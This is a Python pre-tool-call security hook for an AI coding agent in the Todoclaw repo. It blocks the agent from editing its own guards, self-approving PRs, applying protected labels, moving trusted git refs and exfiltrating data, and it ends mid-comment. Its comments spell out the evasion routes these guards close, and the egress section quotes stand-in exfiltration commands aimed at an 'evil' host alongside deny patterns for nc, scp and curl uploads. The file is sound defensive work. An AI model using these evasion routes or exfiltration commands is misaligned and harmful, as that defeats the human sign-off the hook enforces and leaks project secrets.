#!/usr/bin/env python3
"""
PreToolUse security hook for Todoclaw.
Runs before every Claude Code tool call.
Exit 0 = allow. Exit 2 = block (reason on stderr, the stream Claude Code relays).

Error posture (GAP 4, 2026-07-06): Claude Code treats exit code 2 as "block" and
ANY OTHER non-zero exit (e.g. an uncaught Python exception → exit 1) as a
*non-blocking* error — the tool then RUNS. So a crash silently FAILS OPEN. The
security checks below therefore run inside a fail-CLOSED boundary (`_dispatch`):
if a crafted `tool_input` makes a matcher throw, we block instead of allowing.
The workflow guards (branch / merged-PR / cross-worktree) each already swallow
their own git/gh/network errors and return a safe default, so they never reach
that boundary and intentionally stay fail-open.

PIPELINE GUARDS (added 2026-08-25, docs/PIPELINE-CONTRACT.md §2/§3/§5)
The six pipeline-scoped guards at the bottom of this file are OPTIONAL by
construction: they are inert unless `delivery.json` exists at the repo root,
which is the contract's single discriminator. *Off* is not *broken* — a project
that never opted in must see exactly the behaviour it saw before, so the
existence test runs before anything that can fail. See `_pipeline_guards`.
"""
import hashlib
import json
import os
import re
import shutil
import subprocess
import sys
from datetime import datetime, timezone


def block(reason: str) -> None:
    # The reason must go to STDERR: for a blocking exit 2, Claude Code relays
    # stderr to the model and IGNORES stdout — printed there, every deny showed
    # up as "PreToolUse:... hook error: ... No stderr output", reason lost.
    print(f"[Security Hook] BLOCKED: {reason}", file=sys.stderr)
    sys.exit(2)


# ── Branch guard: no edits or commits while on main ─────────────────────────────
# Enforces the feature-branch workflow automatically (see docs/COLLABORATION.md).
# Edit/Write and `git commit` are blocked whenever the todoclaw repo is on a
# protected branch, so starting new work *forces* a branch first. This is what
# keeps main clean and conflict-free when several people (or agents) share the repo.
#
# realpath'd (2026-08-25): the pipeline pin below is keyed on
# sha256(PROJECT_ROOT), and the dispatcher that WRITES the pin keys it on
# sha256(realpath(session root)). If the two spellings differed, every pin would
# read as absent — which in ticket mode fails closed and bricks the session. The
# comparison helpers realpath both sides for the same reason, so a symlinked
# checkout cannot make an in-project path look foreign (a fail-OPEN regression).
PROJECT_ROOT = os.path.realpath(
    os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
)
PROTECTED_BRANCHES = {"main", "master"}
BRANCH_HELP = (
    "You're on `{branch}` in the todoclaw repo, where direct edits/commits are "
    "blocked (docs/COLLABORATION.md). Create a feature branch first, then retry:\n"
    "  git checkout -b <type>/<short-kebab-desc>\n"
    "  (type = feat | fix | chore | refactor | docs; e.g. feat/grid-drag)\n"
    "Pull latest main before branching if collaborators are active: "
    "git checkout main && git pull && git checkout -b <type>/<desc>"
)


# ── Branch naming guard: work only happens on a properly-named branch ──────────
# CLAUDE.md's convention: <type>/<short-kebab-desc>, type in feat|fix|chore|refactor|docs.
# A new worktree session defaults to an auto-generated `claude/<random-codename>`
# branch (e.g. claude/cool-jones-ca5bef) — this landed unrenamed in a real PR (#55).
# Blocks Edit/Write/commit the same way the main/master guard above does, so a
# session is forced to rename before any work happens, not just reminded to.
# The optional `ticket` group (added 2026-08-25) exists so the pipeline's
# ticket-branch guard can read the ticket id out of a branch name without a
# second, drifting regex. It accepts EXACTLY the same language as before —
# the second alternative IS the original pattern, and `tod-90` / `tod-90-foo`
# were already accepted by it — so branch naming itself is unchanged.
BRANCH_NAME_RE = re.compile(
    r"^(feat|fix|chore|refactor|docs)/"
    r"(?:(?P<ticket>[a-z][a-z0-9]*-\d+)(?:-[a-z0-9][a-z0-9-]*)?"
    r"|[a-z0-9][a-z0-9-]*)$"
)
BRANCH_NAME_HELP = (
    "Branch `{branch}` doesn't match this repo's naming convention "
    "(`<type>/<short-kebab-desc>`, type = feat|fix|chore|refactor|docs — see "
    "CLAUDE.md). Rename it before continuing, so an auto-generated worktree "
    "codename never lands in a real PR:\n"
    "  git branch -m <type>/<short-kebab-desc>"
)


def _current_branch() -> str:
    try:
        r = subprocess.run(
            ["git", "-C", PROJECT_ROOT, "rev-parse", "--abbrev-ref", "HEAD"],
            capture_output=True,
            text=True,
            timeout=3,
        )
        return r.stdout.strip() if r.returncode == 0 else ""
    except Exception:
        return ""


# ── Merged-PR guard: no commits/pushes on a branch whose PR already merged ──────
# A branch pushed with more work after its PR merges is silently stranded: GitHub
# stops syncing that PR's head and stops running CI on further pushes to the
# branch (learned the hard way 2026-07-03, PR #54 — see CLAUDE.md's branch
# workflow and the verify-pr-merged-before-followup memory). Only fires once the
# branch has an upstream (skips the common case of fresh local-only branches,
# avoiding a network call), and fails open on any gh/network error — never block
# on something this can't verify.
MERGED_PR_HELP = (
    "`{branch}`'s PR (#{number}) is already MERGED. Commits/pushes here would be "
    "silently stranded — GitHub stops syncing a merged PR's head and stops "
    "running CI on further pushes to that branch. Branch fresh off updated main "
    "instead:\n"
    "  git checkout main && git pull --ff-only && git checkout -b <type>/<desc>"
)


def _has_upstream() -> bool:
    try:
        r = subprocess.run(
            ["git", "-C", PROJECT_ROOT, "rev-parse", "--abbrev-ref", "--symbolic-full-name", "@{u}"],
            capture_output=True,
            text=True,
            timeout=3,
        )
        return r.returncode == 0
    except Exception:
        return False


def _merged_pr_info(branch: str):
    """Returns {"number": ...} if `branch` has a MERGED PR, else None. Fails open."""
    if not shutil.which("gh"):
        return None
    try:
        r = subprocess.run(
            ["gh", "pr", "view", branch, "--json", "state,number"],
            cwd=PROJECT_ROOT,
            capture_output=True,
            text=True,
            timeout=5,
        )
        if r.returncode != 0:
            return None
        info = json.loads(r.stdout)
        return info if info.get("state") == "MERGED" else None
    except Exception:
        return None


def _in_project(path: str) -> bool:
    if not path:
        return False
    try:
        return (
            os.path.commonpath([os.path.realpath(path), PROJECT_ROOT]) == PROJECT_ROOT
        )
    except Exception:
        return False


# ── Self-edit guard: the hook machinery is off-limits INSIDE a session ──────────
# GAP 1 (audit 2026-07-06). settings.json sets defaultMode=bypassPermissions, so
# THIS hook is the entire local runtime gate. On a normal feature branch the branch
# guard happily allows Edit/Write to any in-project file — including this script and
# settings.json themselves. An agent could rewrite the hook to `sys.exit(0)` and
# every guard is off for the rest of the session (command hooks re-read the file per
# call, so it takes effect immediately). So: the hook scripts (.claude/hooks/**) and
# the settings file(s) may only be changed OUTSIDE an agent session. Reads and
# `git add`/`git commit` are NOT mutations and stay allowed, so a session can still
# stage/commit a legitimately-authored hook change (which CI then gates — see
# ci.yml's "Hooks change guard"). Resolving a path fails → treat as protected.
CLAUDE_DIR = os.path.join(PROJECT_ROOT, ".claude")
HOOKS_DIR = os.path.join(CLAUDE_DIR, "hooks")
SELF_EDIT_FILES = {
    os.path.join(CLAUDE_DIR, "settings.json"),
    os.path.join(CLAUDE_DIR, "settings.local.json"),
}
# Path token used by the Bash arm — .claude/hooks/… or .claude/settings[.local].json.
# Either separator, so a Windows-style spelling cannot slip past.
_SELF_EDIT_PATH = r"\.claude[/\\](?:hooks[/\\]|settings(?:\.local)?\.json)"
# The same token, captured, so the Bash arm can resolve the matched path and ask
# whether it belongs to THIS project (see _bash_targets_own_guard).
_SELF_EDIT_TOKEN_RE = re.compile(
    r"(?<![\w.$~-])((?:[^\s'\"|&;<>]*[/\\])?" + _SELF_EDIT_PATH + r"[^\s'\"|&;<>]*)"
)
SELF_EDIT_HELP = (
    "`{path}` is part of the security-hook machinery (.claude/hooks/** or "
    ".claude/settings.json). It is the ENTIRE local runtime guard under "
    "bypassPermissions, so it must be edited OUTSIDE an agent session — never "
    "rewritten by the session it is supposed to be guarding. (Reads and "
    "`git add`/`git commit` of an already-authored change are still allowed; CI's "
    "'Hooks change guard' is the second layer.)"
)
SELF_EDIT_BASH_HELP = (
    "This command would rewrite/replace the security-hook machinery "
    "(.claude/hooks/** or .claude/settings.json) via the shell — blocked. Those "
    "files must be edited outside an agent session. Reading them, and "
    "`git add`/`git commit` of a change authored elsewhere, are still allowed."
)


def _is_self_guard_path(path: str) -> bool:
    """True if `path` is a hook script or a settings file. Unresolvable → protected."""
    if not path:
        return False
    try:
        ap = os.path.realpath(path)
    except Exception:
        return True  # can't resolve → fail closed
    if ap in {os.path.realpath(p) for p in SELF_EDIT_FILES}:
        return True
    try:
        return os.path.commonpath([ap, os.path.realpath(HOOKS_DIR)]) == os.path.realpath(
            HOOKS_DIR
        )
    except Exception:
        return False


def _mutate_re(path_re: str):
    """The write/mutation operator scaffold, aimed at whatever path shape is passed in.

    Rewritten 2026-08-25 to fix a false-positive class: the previous version put
    `sed` and `perl` in the same flat verb list as `rm`/`cp`, so a plain READ —
    `sed -n '1,70p' <file>` — matched as a rewrite and blocked. Reads are not
    mutations, so `sed`/`perl` now require an in-place flag (`-i`).

    The INTERPRETER arm stays. `python3 -c 'open(p,"w")…'` can rewrite a file no
    matter which flags it was launched with, so any python/node/ruby invocation
    NAMING a protected path is blocked — which is why a hook draft is validated
    in a scratch dir under a DIFFERENT filename, and why the battery is run via
    `npm run test:hooks` rather than `python3 .claude/hooks/test_hooks.py`.
    (The other reported false positive — this arm firing on ANOTHER checkout's
    hooks — is fixed by scoping, in _bash_targets_own_guard, not by weakening
    the operator set.)

    Factored out so the pipeline's scope-fence guard below applies the SAME
    operator net to the risk-listed paths rather than growing a second copy that
    drifts.
    """
    return re.compile(
        r">>?\s*['\"]?[^\s'\"|&;<>]*?" + path_re                       # redirect INTO it
        + r"|\btee\b[^|;&\n]*?" + path_re                              # tee it
        + r"|\b(?:sed|perl)\b[^|;&\n]*\s-[a-zA-Z]*i\b[^|;&\n]*?" + path_re  # sed -i
        + r"|\b(?:cp|mv|rm|ln|install|truncate|dd|shred|unlink|chmod|chown|awk)"
          r"\b[^|;&\n]*?" + path_re
        + r"|\bgit\b[^|;&\n]*\b(?:checkout|restore|reset|clean|stash|apply|rm|mv)"
          r"\b[^|;&\n]*?" + path_re
        + r"|\b(?:python3?|node|deno|ruby)\b[^|;&\n]*?" + path_re      # interpreter
    )


_SELF_MUTATE_RE = _mutate_re(_SELF_EDIT_PATH)


def _bash_targets_own_guard(scan: str) -> bool:
    """Does this command mutate THIS PROJECT's guard machinery?

    Scoping added 2026-08-25. The guard used to match `.claude/hooks/…` anywhere
    in a command, so reading an unrelated checkout's hook — a fresh clone in the
    scratchpad, another repo entirely — was blocked as if it were self-edit. It
    is not: this hook protects THIS project's guards, and a path that resolves
    outside PROJECT_ROOT is somebody else's file.

    A RELATIVE path stays protected regardless of where it resolves, because the
    session's shell cwd is not knowable from here and `../../.claude/hooks/x`
    must not become an escape. Only an ABSOLUTE path that lands outside this
    project is exempt.
    """
    if not _SELF_MUTATE_RE.search(scan):
        return False
    tokens = [m.group(1) for m in _SELF_EDIT_TOKEN_RE.finditer(scan)]
    if not tokens:
        return True                      # matched the operator but not the path → fail closed
    for tok in tokens:
        if not os.path.isabs(tok):
            return True                  # relative → assume ours
        try:
            if os.path.commonpath([os.path.realpath(tok), PROJECT_ROOT]) == PROJECT_ROOT:
                return True
        except Exception:
            return True                  # unresolvable → fail closed
    return False


# ── Protected-label guard: an acknowledgement is Braeden's to give ─────────────
# Ported from claude-project-kit PR #40 (TOD-111, 2026-08-26). Flagged as a known
# gap in #397's own PR body: this repo protects the WHOLE `.claude/hooks/`
# directory, which is stricter than the kit — but the kit compensates with THIS
# guard, and without it the strictness buys less than it looks like it does.
#
# `hooks-change` is the label that turns CI's "Hooks change guard" job green. A
# session that can apply it acknowledges its own guard-machinery change — the one
# thing that gate exists to prevent. `agent:*` / `blocked:*` / `provenance:*` are
# dispatcher-owned by docs/PIPELINE-CONTRACT.md §6; the pipeline's lifecycle-label
# guard already refuses them through a TRACKER MCP, but nothing stopped the same
# write arriving as a `gh` command, which is the cheaper spelling.
#
# Scope, stated plainly: this is a first line over command SHAPES, and an
# exhaustive denylist of shell spellings is not achievable. The durable half is
# server-side — a workflow that checks WHO applied the label — and that is what
# covers the spellings this regex will never see.
PROTECTED_LABEL_PREFIXES = ("agent:", "blocked:", "provenance:")
PROTECTED_LABEL_EXACT = ("hooks-change",)
PROTECTED_LABEL_HELP = (
    "🔒 `{label}` is a protected label — Claude may not apply or remove it. These "
    "labels are acknowledgement and supervision, not status: `hooks-change` is how "
    "BRAEDEN signs off that guard machinery changed, and `agent:*` / `blocked:*` / "
    "`provenance:*` are dispatcher-owned (docs/PIPELINE-CONTRACT.md §6). A session "
    "that labels its own PR is acknowledging its own change — the one thing that "
    "gate exists to prevent. Do not reach for another tool or a shell workaround — "
    "instead, print the command for Braeden to run himself, e.g.:\n"
    "  gh pr edit <number> --add-label <the-label>\n"
    "and let him run it. (Reading or listing labels is fine, and so is labelling "
    "with an unrelated label such as `bug` — only the protected set is refused.)"
)

# Label-bearing `gh` subcommands, sliced to the next shell separator so a protected
# label in a LATER chained command is still seen.
_GH_LABEL_CMD_RE = re.compile(r"\bgh\s+(?:pr|issue)\s+(?:edit|create|new)\b([^#\n;&|]*)")
# --add-label / --remove-label / --label / -l, in `--flag=v` and `--flag v` form.
# gh accepts a comma-separated list in one flag, so the value is split on commas.
_LABEL_FLAG_RE = re.compile(
    r"(?<![\w-])(?:--(?:add-|remove-)?labels?|-l)(?:=|\s+)([\"'][^\"']*[\"']|[^\s;&|#]+)"
)
# The REST path that APPLIES labels to one issue/PR. `[^/\s'\"]+` so a shell variable
# (…/issues/$N/labels) matches too. Repo-level label CRUD (`repos/o/r/labels`, which
# is what `gh label create` calls) deliberately does NOT match: DEFINING a label is
# setup, not acknowledgement.
_GH_API_RE = re.compile(r"\bgh\s+api\b([^#\n;&|]*)")
_API_ISSUE_LABELS_RE = re.compile(r"/issues/[^/\s'\"]+/labels\b")
_API_WRITE_RE = re.compile(
    r"(?<![\w-])-X\s*['\"]?(?:POST|PATCH|PUT|DELETE)"
    r"|(?<![\w-])(?:-f|-F|--field|--raw-field|--input)(?![\w-])",
    re.IGNORECASE,
)


def _is_protected_label(name: str) -> bool:
    n = (name or "").strip().strip("\"'").strip().lower()
    return bool(n) and (n in PROTECTED_LABEL_EXACT or n.startswith(PROTECTED_LABEL_PREFIXES))


def _protected_label_in(cmd: str):
    """The first protected label this command would APPLY or REMOVE via `gh`, else None.

    Read paths never match: only the mutating label FLAGS and the issue-labels API
    endpoint are inspected, so `gh pr view`, `gh label list` and `gh issue view
    --json labels` stay frictionless. Labelling with an unrelated label is untouched
    — the value itself has to be in the protected set."""
    for m in _GH_LABEL_CMD_RE.finditer(cmd):
        for f in _LABEL_FLAG_RE.finditer(m.group(1)):
            for part in f.group(1).strip("\"'").split(","):
                if _is_protected_label(part):
                    return part.strip().strip("\"'")
    for m in _GH_API_RE.finditer(cmd):
        seg = m.group(1)
        if not (_API_ISSUE_LABELS_RE.search(seg) and _API_WRITE_RE.search(seg)):
            continue
        for tok in re.findall(r"[\w:.-]+", seg):
            if _is_protected_label(tok):
                return tok
        # A body this hook cannot read (`--input file`, piped stdin). The ENDPOINT is
        # already label application, so fail CLOSED rather than wave an opaque payload
        # through — hiding the label in a file is the obvious next spelling.
        if re.search(r"(?<![\w-])--input(?![\w-])", seg):
            return "<opaque --input payload>"
    return None


# ── PR self-approval guard: an approval is a SECOND pair of eyes, or it is nothing ──
# Ported from claude-project-kit PR #50 / KIT-21 (TOD-111, 2026-08-26). Distinct from
# the pipeline's `self-approval` guard below, which refuses a TRACKER state change into
# `ready`; this one refuses a GitHub review. Same defect class, different surface.
#
# An approval is not a status bit. It is a claim to the next human that somebody ELSE
# read this code. Measured rather than assumed: `braedensc/todoclaw` `main` requires 0
# approving reviews, so an approval does not unlock a merge here today — it makes a
# session's own PR read as reviewed to the person who then merges it by hand, which is
# the failure that matters when he is tired. It is also one branch-protection setting
# away from being a merge unlock.
#
# ONLY approve is refused, deliberately. A `--comment` review is ordinary writing and
# is sometimes genuinely useful (an agent flagging its own uncertainty inline), and
# `--request-changes` on your own PR is meaningless but harmless. Neither manufactures
# a human signal, so the pattern is kept narrow enough to leave both reachable — and
# wide enough that no spelling of approve slips past.
_GH_PR_REVIEW_RE = re.compile(r"\bgh\s+pr\s+review\b([^#\n;&|]*)")
_REVIEW_APPROVE_RE = re.compile(r"(?<![\w-])--approve(?![\w-])")
_REVIEW_EVENT_RE = re.compile(r"(?<![\w-])--(?:approve|comment|request-changes)(?![\w-])")
# pflag CLUSTERS shorthand flags, so `-a` need not be a token of its own: `gh pr
# review -ab "lgtm"` approves just as well as `-a -b "lgtm"`. Collect the letters of
# every single-dash token and look for the event shorthands among them (-a approve,
# -c comment, -r request-changes). Long flags never match — the lookbehind rejects the
# second dash of `--body` — and case is load-bearing, so `-R` (repo) is not `-r`.
_SHORT_CLUSTER_RE = re.compile(r"(?<![\w-])-([a-zA-Z]+)(?![\w-])")
# The REST endpoint that CREATES a review, plus the APPROVE event in its flag, JSON
# and GraphQL spellings. Matched against the WHOLE command rather than only `gh api`:
# *.github.com is on this repo's egress allowlist, so a plain `curl -X POST` aimed at
# api.github.com is not stopped by anything else in this file.
_PR_REVIEWS_PATH_RE = re.compile(r"/pulls/[^/\s'\"]+/reviews\b")
_REVIEW_EVENT_FIELD_RE = re.compile(r"event[\"']?\s*[=:]", re.I)
_APPROVE_EVENT_RE = re.compile(r"event[\"']?\s*[=:]\s*[\"']?\s*APPROVE(?![\w-])", re.I)
_GRAPHQL_REVIEW_RE = re.compile(r"(?<![\w-])(?:add|submit)PullRequestReview(?![\w-])")

SELF_APPROVAL_PR_HELP = (
    "🔒 Approving a pull request is Braeden's action only — and a session approving "
    "its OWN pull request is the whole point of this block. An approval is not a "
    "status bit: it is a claim to the next reviewer that somebody else read the "
    "code, and one branch-protection setting away from being the thing that unlocks "
    "the merge. Claude cannot make that claim about its own work, for the same "
    "reason it cannot merge a PR and cannot apply `hooks-change`. Do not reach for "
    "another tool or a shell workaround — instead, print the command for Braeden to "
    "run himself:\n"
    "  gh pr review <number> --approve\n"
    "and let him run it. {why}"
)
_SELF_APPROVAL_PR_WHY = {
    "approve": "(A `--comment` review is still allowed, and so is `--request-changes` "
               "— only APPROVE manufactures a signal a human is meant to produce. "
               "Reading reviews, and `--add-reviewer` to ASK for one, are untouched.)",
    "interactive": "(A bare `gh pr review` picks its event at an interactive prompt "
                   "this hook cannot see, so it is refused too. Name the event you "
                   "want: `gh pr review <number> --comment` is allowed.)",
    "opaque": "(This is a write to the review-creation endpoint whose event lives in "
              "a body this hook cannot read, so it fails closed. Pass the event as a "
              "visible field instead of hiding it in a file.)",
}


def _self_approval_in(cmd: str):
    """Why this command would APPROVE a pull request, else None.

    Read paths never match: `gh pr view --json reviews`, a plain GET of the reviews
    endpoint, and `--add-reviewer` (which REQUESTS a review rather than gives one)
    all stay frictionless. `_strip_prose` has already blanked quoted `--body`/`-b`
    values by the time this runs, so an approve flag merely NAMED inside review prose
    is not mistaken for one handed to the parser."""
    for m in _GH_PR_REVIEW_RE.finditer(cmd):
        seg = m.group(1)
        shorts = "".join(_SHORT_CLUSTER_RE.findall(seg))
        if _REVIEW_APPROVE_RE.search(seg) or "a" in shorts:
            return "approve"
        # No event flag at all is the INTERACTIVE form, and the prompt it opens offers
        # approve. Same call the label guard makes for an opaque payload: an unreadable
        # event on a review-CREATING command fails closed.
        if not (_REVIEW_EVENT_RE.search(seg) or "c" in shorts or "r" in shorts):
            return "interactive"
    if _APPROVE_EVENT_RE.search(cmd) and (
            _PR_REVIEWS_PATH_RE.search(cmd) or _GRAPHQL_REVIEW_RE.search(cmd)):
        return "approve"
    for m in _GH_API_RE.finditer(cmd):
        seg = m.group(1)
        if not (_PR_REVIEWS_PATH_RE.search(seg) and _API_WRITE_RE.search(seg)):
            continue
        if not _REVIEW_EVENT_FIELD_RE.search(seg):
            return "opaque"
    return None


# ── Config-anchor guard: the git ref store is a trust anchor, not scratch space ──
# Ported from claude-project-kit PR #39 (TOD-111, 2026-08-26); upstream ADR
# 2026-08-24-config-anchor-and-pin-expiry. This repo ALREADY reads config from the
# default branch (see _CONFIG_REFS / _read_delivery_config) and already fails closed
# on an EXPIRED pin while failing open on an ABSENT one (see _read_pin). What was
# missing is the half that makes those two properties mean anything: nothing stopped
# a session from MOVING the ref they read from.
#
# Several guards deliberately read a value from the DEFAULT BRANCH rather than from
# the agent's worktree: the pipeline's `delivery.json` (_read_delivery_config), the
# merged-PR guard's base ref, the changed-file set a CI review is judged against. The
# whole point of reading `origin/main` instead of the working tree is that the working
# tree is model-writable — which only holds while the REF is not. A plain local ref is
# rewritable by one `git update-ref`, so a session that can move `main`/`origin/main`
# to a commit of its own making CHOOSES the config every one of those guards then
# reads, `dispatch.pinsRoot` included — and that is where the pin lives. Anchor
# poisoning is the entire escalation in one command.
#
# So the ref store is human-only, the same way the hook files are. What is blocked is
# WRITING a protected ref, or repointing the remote a protected ref comes from. Every
# read (`git log origin/main`, `git diff origin/main...HEAD`) and the one honest
# writer (`git fetch`, which copies the ref from the real remote) stay allowed — a
# guard that stopped `git fetch` would stop the repo from learning the truth.
#
# TAMPER-EVIDENT, NOT TAMPER-PROOF — the same posture docs/PIPELINE-CONTRACT.md §3
# states for the pin itself. A shell cannot be perfectly fenced by regex; what this
# buys is that the cheap, silent, single-command version of the attack is gone, and
# the backstop stays what it always was: nothing lands without a reviewed PR + CI.
_PROTECTED_REF = r"(?:refs/(?:heads|remotes/[^\s'\"/]+)/)?(?:main|master)(?![\w./-])"
# The `.git/**` metadata that DECIDES what a ref resolves to. Reads are untouched; the
# operator scaffold is the same one the self-edit guard uses (see _mutate_re).
_GIT_STORE = (r"\.git[/\\](?:refs[/\\][^\s'\"|&;<>]*|packed-refs|config|HEAD"
              r"|logs[/\\][^\s'\"|&;<>]*|worktrees[/\\][^\s'\"|&;<>]*)")
_GIT_STORE_MUTATE_RE = _mutate_re(_GIT_STORE)
_REF_WRITE_RES = (
    # These verbs exist to change what a name resolves to. None of them appears in
    # this repo's workflow, so they are blocked outright rather than by target. The
    # lookarounds keep the verb from matching inside a PATH or a flag value
    # (`git show HEAD:src/replace.ts`, `git log --grep=replace`, `git checkout
    # replace-me`) — the same targeting discipline the guards above use.
    re.compile(r"\bgit\b[^|;&]*?(?<![\w./=-])"
               r"(?:update-ref|replace|fast-import|filter-branch)(?![\w./-])"),
    re.compile(r"\bgit\b[^|;&]*\bsymbolic-ref\b[^|;&]*" + _PROTECTED_REF),
    # `git branch -f/-M/-D/-d/-m main` — force-move or delete a protected branch.
    # The flag must be its OWN token, so the read-only spellings that merely mention
    # the branch (`git branch --merged main`, `--contains main`) do not match. The
    # documented codename rename (`git branch -m fix/…`) carries no protected ref and
    # is therefore untouched.
    re.compile(r"\bgit\b[^|;&]*\bbranch\b[^|;&]*"
               r"(?:(?<=\s)-[a-zA-Z]*[fMDdm](?=[\s'\"]|$)|--force\b|--delete\b|--move\b)"
               r"[^|;&]*(?<![\w./-])" + _PROTECTED_REF),
    # A fetch/pull REFSPEC (`<src>:<dst>`) whose destination is a protected ref — how
    # a hostile remote gets copied over origin/main. A plain `git fetch origin main`
    # carries no colon and stays allowed, and an SSH URL (`git@host:main/repo.git`)
    # cannot match: the ref lookahead excludes `/`.
    re.compile(r"\bgit\b[^|;&]*\b(?:fetch|pull)\b[^|;&]*:" + _PROTECTED_REF),
    # Repointing `origin` itself and then fetching reaches the same place. `add` is
    # deliberately NOT here: git refuses to add a remote that already exists, so it
    # cannot repoint an anchor — repointing needs `remove` or `set-url` first, and
    # both are blocked. That keeps first-push bootstrap (`git remote add origin …`)
    # working, which is the one time a human legitimately types this.
    re.compile(r"\bgit\b[^|;&]*\bremote\b[^|;&]*"
               r"\b(?:set-url|set-head|rename|remove|rm)\b"
               r"[^|;&]*(?<![\w.-])origin(?![\w.-])"),
)
_GIT_CONFIG_REMOTE_RE = re.compile(
    r"\bgit\b[^|;&]*\bconfig\b[^|;&]*(?<![\w.-])remote\.origin\.url(?![\w.-])")
_GIT_CONFIG_READ_RE = re.compile(r"(?:^|\s)--(?:get|get-all|get-regexp|list)\b")
CONFIG_ANCHOR_HELP = (
    "🔒 That command would rewrite a git ref — or the remote a ref comes from — that "
    "this hook suite TRUSTS. Guards deliberately read values from the default branch "
    "instead of your worktree (`delivery.json`, the merged-PR base, the changed-file "
    "set a review is judged against), so a session that can move `main`/`origin/main` "
    "picks the values that judge it — `dispatch.pinsRoot` included, which is where "
    "the dispatcher pin lives. Moving a protected ref, repointing `origin`, or "
    "writing into `.git/` is Braeden's action at a terminal. Reads (`git log`, "
    "`git diff origin/main...HEAD`) and a plain `git fetch` are untouched."
)


def _in_git_store(path: str) -> bool:
    """True when `path` lands inside ANY `.git` directory — the Edit/Write twin of
    _GIT_STORE_MUTATE_RE. Component-wise, so `.gitignore` and `.github/` (which only
    *start* with `.git`) are never caught."""
    if not path:
        return False
    try:
        parts = os.path.abspath(path).replace(os.sep, "/").split("/")
    except Exception:
        return True  # unresolvable path → fail CLOSED
    return ".git" in parts

# ── Egress guard: block obvious outbound exfiltration ───────────────────────────
# GAP 3 (audit 2026-07-06). The supply-chain guard below stops `curl … | bash`
# (inbound), but nothing stopped OUTBOUND exfil like `curl -d @.env.local https://evil`
# or `curl 'https://evil/?k=$SECRET'` — which under bypassPermissions runs with no
# prompt. We can't enumerate every shape, so this is a conservative denylist of the
# obvious ones: a network tool (curl/wget/scp/sftp/nc) talking to a NON-allowlisted
# host while also uploading data / reading a local file / splicing a shell var into
# the URL, or any raw socket / scp-style push to such a host. Plain inbound GETs
# (downloads) to unknown hosts stay allowed. Host allowlist is a domain-boundary
# suffix match, so `evil-github.com` and `github.com.evil.tld` are NOT allowlisted.
EGRESS_ALLOW_SUFFIXES = (
    "localhost",
    "127.0.0.1",
    "0.0.0.0",
    "::1",
    "github.com",
    "githubusercontent.com",
    "anthropic.com",  # api.anthropic.com
    "supabase.co",
    "supabase.com",
    "linear.app",  # api.linear.app — the delivery pipeline's GraphQL endpoint
)
NET_TOOL_RE = re.compile(r"(?<![\w./-])(?:curl|wget|scp|sftp|ncat|netcat|nc)(?![\w-])")


def _host_allowlisted(host: str) -> bool:
    host = host.lower()
    return any(host == s or host.endswith("." + s) for s in EGRESS_ALLOW_SUFFIXES)


def _egress_hosts(cmd: str):
    """Best-effort remote hosts targeted by curl/wget/scp/sftp/nc in `cmd`."""
    hosts = []
    # scheme://[user[:pass]@]host[:port]/…
    for m in re.finditer(r"[a-zA-Z][a-zA-Z0-9+.-]*://([^/\s'\"]+)", cmd):
        authority = m.group(1).rsplit("@", 1)[-1]  # drop any user:pass@
        host = authority.split(":", 1)[0].strip("[]")  # drop :port / IPv6 brackets
        if host:
            hosts.append(host)
    # scp/sftp/ssh style user@host:path (no scheme)
    for m in re.finditer(r"(?<![\w./-])[\w.-]+@([\w.-]+):", cmd):
        hosts.append(m.group(1))
    # nc/ncat/netcat: a "host port" pair somewhere in the command
    for m in re.finditer(r"(?<![\w-])(?:nc|ncat|netcat)(?![\w-])([^|;&\n]*)", cmd):
        hm = re.search(
            r"(?<![\w./-])((?:\d{1,3}\.){3}\d{1,3}|[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|localhost)\s+\d{1,5}\b",
            m.group(1),
        )
        if hm:
            hosts.append(hm.group(1))
    # schemeless curl/wget target that carries a path, e.g.
    # `curl -d @x github.com.evil.tld/collect`. Requiring a trailing "/" (or :port/)
    # keeps a bare upload filename like `report.txt` from being read as a host.
    if re.search(r"(?<![\w-])(?:curl|wget)(?![\w-])", cmd):
        for m in re.finditer(
            r"(?<![\w@./:-])((?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}|(?:\d{1,3}\.){3}\d{1,3})(?::\d+)?/",
            cmd,
        ):
            hosts.append(m.group(1))
    return hosts


# ── Cross-worktree write guard: never write into a DIFFERENT checkout ───────────
# The branch guards above only fire for paths INSIDE this worktree (_in_project).
# A write whose path belongs to a SIBLING/PARENT worktree — classically the main
# checkout (on `main`), reached via a persisted `cd` into it — skips every guard and
# lands there SILENTLY: tests/typecheck here still pass against the unmodified files,
# so a whole session's edits can go to the wrong checkout unnoticed (2026-07-03 retro,
# see todoclaw-cross-worktree-write-gotcha). Resolve the target's OWNING worktree via
# `git worktree list` (the most-specific/longest root that contains it); if that isn't
# THIS session's worktree, block. Fails open (no git / not a worktree → owner None →
# allow), and same-worktree writes are untouched (owner == PROJECT_ROOT), so paths
# outside the repo (scratchpad, ~/.claude memory, /tmp) and normal edits are unaffected
# — the guard cannot lock the session out of its own worktree.
CROSS_WORKTREE_HELP = (
    "Cross-worktree write blocked — this path is in a DIFFERENT checkout than your session:\n"
    "  target worktree: {owner}\n"
    "  your session:    {here}\n"
    "Writing into another worktree (especially the MAIN checkout, usually on `main`) lands "
    "there SILENTLY: the branch guard only protects your own worktree, and your tests/typecheck "
    "would still pass against the unmodified files here. Use your OWN worktree's path instead:\n"
    "  {suggested}\n"
    "(Usual cause: a persisted `cd` into another checkout — prefer absolute worktree paths and "
    "`git -C <dir>` over `cd`. If you genuinely must edit the other worktree, do it from a "
    "session rooted there.)"
)


def _worktree_roots():
    """Absolute roots of every git worktree for this repo, or [] on any failure."""
    try:
        r = subprocess.run(
            ["git", "-C", PROJECT_ROOT, "worktree", "list", "--porcelain"],
            capture_output=True,
            text=True,
            timeout=3,
        )
        if r.returncode != 0:
            return []
        return [
            os.path.abspath(line[len("worktree ") :].strip())
            for line in r.stdout.splitlines()
            if line.startswith("worktree ")
        ]
    except Exception:
        return []


def _owning_worktree(path: str, roots):
    """The most-specific (longest) worktree root that contains `path`, or None."""
    try:
        ap = os.path.realpath(path)
    except Exception:
        return None
    best = None
    for root in roots:
        try:
            root = os.path.realpath(root)
            if os.path.commonpath([ap, root]) == root and (
                best is None or len(root) > len(best)
            ):
                best = root
        except Exception:
            continue
    return best


# ── Secret-file target match (Bash) ─────────────────────────────────────────────
# GAP 2 (audit 2026-07-06). The old guard was a verb denylist (cat/less/head/tail/
